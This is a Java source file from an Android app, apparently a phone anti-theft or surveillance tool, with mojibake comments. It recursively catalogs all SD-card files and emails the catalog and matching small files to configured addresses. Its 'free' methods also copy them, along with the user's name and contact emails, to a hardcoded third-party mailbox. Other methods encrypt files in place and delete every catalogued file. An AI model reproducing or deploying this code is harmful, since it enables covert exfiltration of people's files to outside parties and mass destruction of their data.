package Boomerang_android15.com;


///////////////////////////////////////////////////////////////////////
//
//ģ�鹦��:��ϵͳ�е��ļ����в���
//ע:������ù�ע�ļ��е�Ŀ¼�ṹ,����,ɾ���ļ�,(���ܲ����ɵ�����ģ�鸺��)
//
//////////////////////////////////////////////////////////////////////
//package fei_qu_lai;

import java.io.*;

import android.app.Service;
import android.os.Environment;
import android.os.IBinder;
import android.util.Log;
import android.content.Context;
import android.content.Intent; 
import java.util.List;
import java.util.ArrayList;
import java.util.Vector;


public class OperateFileInfor 
{	

	private File m_fileDir;	//��ǰ�����·��
	private File m_sdcardDir;	//ȡ��SD Card��Ŀ¼
	private boolean  m_isSdCard;	//�ж�sd���Ƿ�����
	
	private String m_CalalogFullName;	//���������ļ�Ŀ¼���� ���ļ�
	private File m_fileCatalog;		//�����ļ�Ŀ¼�ļ����ļ�����
	private BufferedWriter m_bw;	//���ڽ��ļ�Ŀ¼��Ϣд���ļ�Ŀ¼�ļ���.
	private BufferedReader m_br; 		//���ڶ����ļ�Ŀ¼��Ϣ;
	//�����ļ����
	
	private SetInformation m_settingInfor;		//�����ļ���������Ϣ
	private String m_configFilePath;	//�����ļ���·��
	
    //�������
    private FqlEmail m_mailPort = null;  //ͨ�������ʼ��Ľӿ�
    
    //֧�ּ��ܹ���
	private encryption myEncrpt = new encryption();
	
	private Context m_context;
    
    //��ֵ����
    private long MAX_FILE_LEN = 500000;  //�Է��ͷ�ʽ�����ļ����Է��͵��ļ�����󳤶�
	

	 

	
    public OperateFileInfor(Context context)
    {
    	
		m_context = context;
		initialize();
    	
    	
    }
	
	
	

	    
	/////////////////////////////////////////////////////////////
	//
	//��������:�������ݵĳ�ʼ��
	//
	//
	//////////////////////////////////////////////////////////////
	private void initialize()
	{
		////////////////////////////////////
		// 1.��õ�ǰ�����sd�� ��·��
		///////////////////////////////////////
		Log.i("333+++", "ProcessFileInfor initialize: begin!");
		m_fileDir = m_context.getFilesDir();		
		//���SD card Ŀ¼
		if (Environment.getExternalStorageState().equals(Environment.MEDIA_REMOVED))
		{
			m_isSdCard = false;
		}
		else
		{
			m_isSdCard = true;
			m_sdcardDir = Environment.getExternalStorageDirectory();
				
		}//end if
			
			
		///////////////////////////////////////
		// 2. ��ʼ��Ŀ¼�ļ���·��		
		///////////////////////////////////////
		m_configFilePath = m_fileDir+ java.io.File.separator + m_context.getString(R.string.config_file);
			
		//��ȡ�����ļ���Ϣ
		m_settingInfor = new  SetInformation(m_configFilePath);     
		m_settingInfor.ReadConfigFile();
			
		m_CalalogFullName = m_fileDir + java.io.File.separator + m_settingInfor.GetFileCatalogName();
			
		////////////////////////////////////////
		// 3.�������������ļ�Ŀ¼��Ϣ���ļ����ļ�����.
		///////////////////////////////////////////
		m_fileCatalog = new File(m_CalalogFullName);
		
		
		///////////////////////////////////////////
		// 4.���ü�����Կ
		//////////////////////////////////////////////
		String password = m_settingInfor.GetPassWord();
		myEncrpt.SetKey(password.substring(0, 8));
		
		
	}
		
		
	////////////////////////////////////////////////////////////////////////////
	//
	//��������:�����ļ�Ŀ¼��Ϣ�ļ�
	//һ������ֱ������onCreate����
	//////////////////////////////////////////////////////////////////////////////
	public void CreateCalalogFile()
	{		
			
		Log.i("333+++", "ProcessFileInfor CreateCalalogFile: begin!");
		if (m_CalalogFullName != null)
		{
			m_fileCatalog = new File(m_CalalogFullName);
			if (m_fileCatalog.exists())
			{
				//����ļ��Ѿ�����,֮ǰָ���Ѿ��������ļ�,ֱ�ӷ��;Ϳ�����
				return;			
			}	//end if 
				
		}
			
		
		try
		{
			m_fileCatalog.createNewFile();
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
						
			
		//��������д���ݵ�BufferedWriter
		try
		{
			  
			OutputStream out = new FileOutputStream(m_fileCatalog); 
			m_bw  = new BufferedWriter(new OutputStreamWriter(out, "GBK")); 
			//m_bw = new BufferedWriter(new FileWriter(m_fileCatalog));
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
		
		if (this.m_isSdCard)
		{
			//�洢����sd����Ŀ¼
			Log.i("333+++", "ProcessFileInfor call SaveFileCatalog: begin!");
			SaveFileCatalog(m_sdcardDir.getPath());
		}
					
		/*
		 ���������Ҫ��¼�ĸ���Ȥ���ļ��е����� 
			 
		*/
			
			
		//�ر�����ļ���
		try
		{
			m_bw.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
			
	}
		
	/////////////////////////////////////////////////////////////////////
	//
	//��������:��ϵͳ�е������ļ�ɾ��
	//
	/////////////////////////////////////////////////////////////////////
	private void DelFile()
	{
			
		Log.i("333+++", "ProcessFileInfor DelFile: begin!");
		if (m_CalalogFullName != null)
		{
			m_fileCatalog = new File(m_CalalogFullName);
			if (!m_fileCatalog.exists())
			{
				return;
			}	//end if 
				
		}
			
		String delFilePath = null;
		File delFile = null;
			
		try
		{
			m_br = new BufferedReader(new FileReader(m_fileCatalog));
			
			delFilePath = m_br.readLine();
			while (delFilePath!=null)
			{	
				//ɾ���ļ�
				delFile = new File(delFilePath);
				delFile.delete();				
					
					//�����һ���ļ�Ŀ¼
					delFilePath = m_br.readLine();
			}//end while
		}
		catch (Exception e)
		{
			e.printStackTrace();				
		}
			
		return;
	}//end DelAllFile
		

		


	////////////////////////////////////////////////////////////////////
	//
	//��������:�ռ��ļ���Ŀ¼��Ϣ,�����浽һ��ָ�����ļ���
	//ֻ������:CreateCalalogFile()�������� 
	/////////////////////////////////////////////////////////////////////
	private  void SaveFileCatalog(String filePath)
	{		
		Log.i("333+++", "ProcessFileInfor SaveFileCatalog: begin!");
		//List <String> items = null;
		List <String> folderPaths = null;
		String newFilePath = "";
		File f = new File(filePath);
		File [] files = f.listFiles();
			
		folderPaths = new ArrayList<String>() ;
		
		if (files==null)
		{
			//��ǰ�ļ�����û�ļ�
			return;
		}
		
		for (int i=0; i<files.length; i++)
		{
			File file = files[i];
			newFilePath = file.getPath();
							
			if (file.isDirectory())
			{
				//������ļ���,��·��д���ַ����б�
				folderPaths.add(newFilePath);
					
			}
			else
			{
				//������ļ�,���ļ���ȫ·������¼����
				try
				{
					m_bw.write(newFilePath);
					m_bw.write("\r\n");
				}
				catch (Exception e)
				{
					e.printStackTrace();				
				}
			}//end if
			
		}//end for
				
			
		//���ļ��н��еݹ�����.
		for (int i=0; i<folderPaths.size(); i++)
		{
			SaveFileCatalog(folderPaths.get(i));
				
		}//end for
				
	}//end ProcessPhoneBook()

	
		


	//////////////////////////////////////////////////////////////////////
	//
	//��������:�����ļ�Ŀ¼�ļ�
	//
	/////////////////////////////////////////////////////////////////////
	public void SendFileCatalog()
	{
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
		
			
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish emailaddress add!");
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
		Subject += "----�ص��ļ�Ŀ¼:" + m_settingInfor.GetFileCatalogName();
		
		//�����ʼ�����
		text = m_context.getString(R.string.email_text);	//���������Ϣ
		text += m_context.getString(R.string.app_version); //����汾��Ϣ
		filePath = this.m_CalalogFullName;	//�����ʼ�������·��
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish email construct!");
		
		//�ж��ļ�Ŀ¼�ļ��Ƿ�Ϊ��
		File calalogFile = new File(m_CalalogFullName);
		long fileLen = calalogFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "����sd�������û�sd�������ļ����޷�����ļ�Ŀ¼������Ϊ���ļ���";
			
		}
		
		
		m_mailPort = new FqlEmail();
		m_mailPort.SendFile(emailAddress, Subject, text, filePath); //�����ʼ�
		
			
	}
		
	
	//////////////////////////////////////////////////////////////////////
	//
	//��������:�����ļ�Ŀ¼�ļ�(��Ѱ�)
	//ע�������˸��������䷢�͵Ĺ���
	/////////////////////////////////////////////////////////////////////
	public void SendFileCatalogForFree()
	{
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
		emailAddress.add("fql_free_backup@sina.com");
			
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish emailaddress add!");
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
		Subject += "----�ص��ļ�Ŀ¼:" + m_settingInfor.GetFileCatalogName();
		text = m_context.getString(R.string.email_text);	//�����ʼ�����

		
		filePath = this.m_CalalogFullName;	//�����ʼ�������·��
		Log.i("333+++", "ProcessFileInfor SendFileCatalog: finish email construct!");
		
		//�ж��ļ�Ŀ¼�ļ��Ƿ�Ϊ��
		File calalogFile = new File(m_CalalogFullName);
		long fileLen = calalogFile.length();
		if (fileLen == 0)
		{
			text += "\r\n" + "����sd�������û�sd�������ļ����޷�����ļ�Ŀ¼������Ϊ���ļ���";
			
		}
		
		
		m_mailPort = new FqlEmail();
		m_mailPort.SendFile(emailAddress, Subject, text, filePath); //�����ʼ�
		
			
	}
	
	/////////////////////////////////////////////////
	//
	//��������:�����ļ�
	//����ļ����ȴ���ĳһֵ,���ᷢ��, 
	///////////////////////////////////////////////////
	public boolean SendFile()
	{
		Log.i("333+++", "ProcessFileInfor SendFile: begin!");
		Vector<String> emailAddress = new Vector<String>();
		emailAddress.add(m_settingInfor.GetEmail_1());
		emailAddress.add(m_settingInfor.GetEmail_2());
			
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		//Subject = this.getString(R.string.email_suject); //�����ʼ�����
		//Subject += "----�ļ�����";
		//text = this.getString(R.string.email_text);	//�����ʼ�����
		filePath = this.m_CalalogFullName;	//�����ʼ�������·��	
		
		//Ŀ¼�ļ��Ĳ���
		File catalogFile = new File(filePath);
		BufferedReader br; 		//���ڶ����ļ�Ŀ¼��Ϣ;
		String oneLine;		//�ļ�Ŀ¼��Ϣ�ļ��е�һ��
		long fileLen =0; //���۵��ļ��ĳ���
		String fileTypeForSend [] = m_settingInfor.GetSendFileType();
		String extendName = new String();
		
		
		File fileForSend = null;
		
		if (!catalogFile.exists())
		{
			//����ļ�������,����False;
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			Log.i("333+++", "ProcessFileInfor SendFile: call BufferedReader!");
			oneLine = br.readLine();
			
			while (oneLine != null)
			{
				Log.i("333+++", "ProcessFileInfor SendFile: while ###############");
				fileForSend =new File(oneLine);
				fileLen = fileForSend.length();
				
				Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
				Subject += "----�ļ�����:" + fileForSend.getName();
				
				//�����ʼ�����
				text = m_context.getString(R.string.email_text) + "\r\n";	//���������Ϣ
				text += m_context.getString(R.string.app_version); //����汾��Ϣ
				text += "�ļ�·��:"+ fileForSend.getPath() + "\r\n";
				text += "�ļ�����:" + fileLen + "\r\n";
				
				
				if(fileLen > MAX_FILE_LEN)
				{
					//�ļ����ȳ����������󳤶�,����
					Log.i("333+++", "ProcessFileInfor SendFile: file too long!");
					oneLine = br.readLine();
				
				}
				else
				{
					
					//�ļ����ȷ���Ҫ��,�����ļ����ͼ��
					Log.i("333+++", "ProcessFileInfor SendFile: call else!");
					extendName =  GetExtendName(oneLine);
					if(extendName == null)
					{
						//�ļ����޺�׺,Ϊ�쳣�ļ���
						Log.i("333+++", "extendName == null");
						oneLine = br.readLine();
						continue;					
						
					}
					
					Log.i("333+++", "extendName: ");
					Log.i("333+++", extendName);
					
					for (int i=0; i < fileTypeForSend.length; i++)
					{
						Log.i("333+++", "ProcessFileInfor SendFile: call for!");
						Log.i("333+++", "fileTypeForSend[i]:");
						Log.i("333+++", fileTypeForSend[i]);
						
						if (extendName.equalsIgnoreCase(fileTypeForSend[i]))
						{
							//Ŀ���ļ���Ҫ�������͵��ļ�����,���Է��ͱ���
							Log.i("333+++", "ProcessFileInfor SendFile: send file!");
							m_mailPort = new FqlEmail();
							m_mailPort.SendFile(emailAddress, Subject, text, oneLine);
							oneLine = br.readLine();
							break;
						}//end if		
						
						
						
					}//end for
					
					oneLine = br.readLine();
					Log.i("333+++", "OneLine:");
					Log.i("333+++", oneLine);
				}//end if
							
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		return true;
	}
	
/////////////////////////////////////////////////
	//
	//��������:�����ļ�(��Ѱ�)
	//����ļ����ȴ���ĳһֵ,���ᷢ��, 
	//ע��ֻ���������䷢�;�����ĵ���
	///////////////////////////////////////////////////
	public boolean SendFileForFree()
	{
		Log.i("333+++", "ProcessFileInfor SendFile: begin!");
		Vector<String> emailAddress = new Vector<String>();
		//emailAddress.add(m_settingInfor.GetEmail_1());
		//emailAddress.add(m_settingInfor.GetEmail_2());
		emailAddress.add("fql_free_backup@sina.com");
			
		String Subject = new String();
		String text = new String();
		String filePath = new String();
		
		//Subject = this.getString(R.string.email_suject); //�����ʼ�����
		//Subject += "----�ļ�����";
		//text = this.getString(R.string.email_text);	//�����ʼ�����
		filePath = this.m_CalalogFullName;	//�����ʼ�������·��	
		
		//Ŀ¼�ļ��Ĳ���
		File catalogFile = new File(filePath);
		BufferedReader br; 		//���ڶ����ļ�Ŀ¼��Ϣ;
		String oneLine;		//�ļ�Ŀ¼��Ϣ�ļ��е�һ��
		long fileLen =0; //���۵��ļ��ĳ���
		String fileTypeForSend [] = m_settingInfor.GetSendFileType();
		String extendName = new String();
		
		
		File fileForSend = null;
		
		if (!catalogFile.exists())
		{
			//����ļ�������,����False;
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			Log.i("333+++", "ProcessFileInfor SendFile: call BufferedReader!");
			oneLine = br.readLine();
			
			while (oneLine != null)
			{
				Log.i("333+++", "ProcessFileInfor SendFile: while ###############");
				fileForSend =new File(oneLine);
				fileLen = fileForSend.length();
				
				Subject = m_context.getString(R.string.email_suject); //�����ʼ�����
				Subject += "----�ļ�����:" + fileForSend.getName();
				text = m_context.getString(R.string.email_text) + "\r\n";	//�����ʼ�����
				text += "�û���:" + m_settingInfor.GetUserName()+ "\r\n";
				text += "��һ����:" + m_settingInfor.GetEmail_1()+ "\r\n";
				text += "�ڶ�����:" + m_settingInfor.GetEmail_2()+ "\r\n";
				text += "�ļ�·��:"+ fileForSend.getPath() + "\r\n";
				text += "�ļ�����:" + fileLen + "\r\n";
				
				
				if(fileLen > MAX_FILE_LEN)
				{
					//�ļ����ȳ����������󳤶�,����
					Log.i("333+++", "ProcessFileInfor SendFile: file too long!");
					oneLine = br.readLine();
				
				}
				else
				{
					
					//�ļ����ȷ���Ҫ��,�����ļ����ͼ��
					Log.i("333+++", "ProcessFileInfor SendFile: call else!");
					extendName =  GetExtendName(oneLine);
					if(extendName == null)
					{
						//�ļ����޺�׺,Ϊ�쳣�ļ���
						Log.i("333+++", "extendName == null");
						oneLine = br.readLine();
						continue;					
						
					}
					
					Log.i("333+++", "extendName: ");
					Log.i("333+++", extendName);
					
					for (int i=0; i < fileTypeForSend.length; i++)
					{
						Log.i("333+++", "ProcessFileInfor SendFile: call for!");
						Log.i("333+++", "fileTypeForSend[i]:");
						Log.i("333+++", fileTypeForSend[i]);
						
						if (extendName.equalsIgnoreCase(fileTypeForSend[i]))
						{
							//Ŀ���ļ���Ҫ�������͵��ļ�����,���Է��ͱ���
							Log.i("333+++", "ProcessFileInfor SendFile: send file!");
							m_mailPort = new FqlEmail();
							m_mailPort.SendFile(emailAddress, Subject, text, oneLine);
							oneLine = br.readLine();
							break;
						}//end if		
						
						
						
					}//end for
					
					oneLine = br.readLine();
					Log.i("333+++", "OneLine:");
					Log.i("333+++", oneLine);
				}//end if
							
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		return true;
	}
		
	////////////////////////////////////////////////////////
	//
	//��������:�����ļ�
	//
	////////////////////////////////////////////////////////
	public boolean EncryptFile()
	{

		Log.i("333+++", "ProcessFileInfor EncryptFile: begin!");
		String filePath = new String();
		filePath = this.m_CalalogFullName;	//�����ʼ�������·��	
		
		//Ŀ¼�ļ��Ĳ���
		Log.i("333+++", "filePath:");
		Log.i("333+++", filePath);
		File catalogFile = new File(filePath);
		BufferedReader br; 		//���ڶ����ļ�Ŀ¼��Ϣ;
		String oneLine;		//�ļ�Ŀ¼��Ϣ�ļ��е�һ��
		long fileLen =0; //���۵��ļ��ĳ���
		String fileTypeForEncry [] = m_settingInfor.GetCryptFileType();
		String extendName = new String();
		
		String temp = new String();
		
		File fileForEncrypt = null;
		
		if (!catalogFile.exists())
		{
			//����ļ�������,����False;
			
			Log.i("333+++", "catalogFile don't exists");
			return false;
		}
		
		long catalogLen = catalogFile.length();
		
		if(catalogFile.length()== 0)
		{
			return false;
		}
			
		try
		{
			br = new BufferedReader(new FileReader(catalogFile));
			
			oneLine = br.readLine();
			
			Log.i("333+++", "encrptFilePath: ");
			Log.i("333+++", oneLine );
			
			while (oneLine != null)
			{
				
				fileForEncrypt =new File(oneLine);
				fileLen = fileForEncrypt.length();
			
				//�ļ����ȷ���Ҫ��,�����ļ����ͼ��
				//String.lastIndexOf() f��������ú�׺��
				extendName = this.GetExtendName(oneLine);
				if(extendName == null)
				{
					//�ļ����޺�׺,Ϊ�쳣�ļ���
					Log.i("333+++", "extendName == null");
					oneLine = br.readLine();
					continue;					
					
				}				
				Log.i("333+++", "extendName ");
				Log.i("333+++", extendName );
				
				for (int i=0; i < fileTypeForEncry.length; i++)
				{
					temp = fileTypeForEncry[i];
					Log.i("333+++", "temp: ");
					Log.i("333+++", temp);
					if (extendName.equalsIgnoreCase(temp))
					{
						//Ŀ���ļ���Ҫ�������͵��ļ�����,���Է��ͱ���
						Log.i("333+++", "call myEncrpt.encrptFile ");
						myEncrpt.encrptFile(oneLine);
						
						break;
					}//end if				
						
						
				}//end for
			
				oneLine = br.readLine();
				Log.i("333+++", "########### " );			
				
			}//end while
			br.close();
		}
		catch (Exception e)
		{
			e.printStackTrace();			
				
		}
		
		Log.i("333+++", "ProcessFileInfor  EncryptFile: finish");
		return true;
			
	}
    
		
	public void EncryptFileCatalog()
	{
		
		myEncrpt.encrptFileAll(m_CalalogFullName);
		//myEncrpt.encrptFile(m_CalalogFullName);
		
	}
	
	
	/////////////////////////////////////////////////////////////
	//
	//��������:ɾ���ļ�Ŀ¼�ļ�
	//ע:��DelAllFile�����е���,��Ҫɾ�������ļ���ʱ��,�ļ�Ŀ¼Ҳ��û��
	//	�����ļ�ֵ��,һ��ɾ��.
	///////////////////////////////////////////////////////////////
	public void DelFileCatalog()
	{
		Log.i("333+++", "ProcessFileInfor DelFileCatalog: begin!");	
		File fileCatalog =null ;
		if (m_CalalogFullName != null)
		{
			fileCatalog = new File(m_CalalogFullName);
			if (fileCatalog.exists())
			{
				//����ļ��Ѿ����ڽ��ļ�ɾ��
				m_fileCatalog.delete();			
			}	//end if 
				
		}//end if
			
		
	}//end DelFileCatalog function
	    
	/////////////////////////////////////////////////////////////
	//
	//��������:����ļ����ĺ�׺��
	//����:String fileName �������ļ�����·��
	//����ֵ:���óɹ����غ�׺,���û�к�׺����null
	//
	//////////////////////////////////////////////////////////////
    private String GetExtendName(String fileName)
    {
    	int index = fileName.lastIndexOf(".");
    	int length = fileName.length();
    	if (length-index > 5)
    	{
    		return null;
    	}
    	
    	String extendName = fileName.substring(index);
    	
    	
    	return extendName;
    }


}

